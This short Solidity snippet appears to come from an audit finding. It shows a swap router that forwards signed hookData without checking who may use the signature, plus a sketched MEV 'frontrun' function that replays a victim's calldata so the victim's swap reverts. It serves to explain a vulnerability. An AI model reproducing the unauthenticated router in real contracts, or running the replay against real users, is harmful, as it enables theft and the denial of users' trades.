contract SimpleSwapRouter {
    IPoolManager public poolManager;
    
    // Public function - anyone can submit swaps on behalf of any signed calldata
    function swap(
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external payable {
        // hookData contains signature + nonce + expiryTime
        // No check that msg.sender is authorized to use this signature
        poolManager.swap(key, params, hookData);
    }
}

// MEV bot can extract and re-submit
function frontrun(bytes calldata originalCalldata) external {
    // Parse original transaction
    (PoolKey memory key, IPoolManager.SwapParams memory params, bytes memory hookData) = abi.decode(originalCalldata, (PoolKey, IPoolManager.SwapParams, bytes));
    
    // Re-submit with same signature (sender field points to router)
    router.swap{value: params.amountSpecified}(key, params, hookData);
    // Nonce is consumed, original swap reverts
}